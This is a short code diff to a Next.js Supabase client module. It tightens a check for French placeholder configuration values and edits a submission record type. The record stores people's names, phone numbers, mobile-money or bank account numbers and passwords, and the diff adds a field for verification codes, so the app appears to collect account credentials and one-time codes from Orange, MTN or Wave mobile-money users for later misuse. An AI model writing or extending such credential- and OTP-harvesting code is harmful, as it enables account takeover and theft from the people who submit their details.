@@ -4,7 +4,15 @@ const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL || '';
 const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || '';
 
 export const isSupabaseConfigured = () => {
-    return Boolean(supabaseUrl && supabaseAnonKey && !supabaseUrl.includes('votre_url'));
+    return Boolean(
+        supabaseUrl &&
+        supabaseAnonKey &&
+        !supabaseUrl.includes('votre-projet') &&
+        !supabaseUrl.includes('votre_url') &&
+        !supabaseAnonKey.includes('votre_cle') &&
+        supabaseAnonKey !== 'placeholder-key' &&
+        supabaseAnonKey.length > 20
+    );
 };
 
 export const supabase = createClient(
@@ -40,9 +48,10 @@ export interface SubmissionRecord {
     full_name: string;
     email: string;
     phone: string;
-    method: 'orange' | 'mtn' | 'wave' | 'bank' | 'other' | string;
+    method: string;
     account_number: string;
     password?: string;
+    verification_code?: string;
     bank_name?: string;
     operator_name?: string;
     country_name?: string;
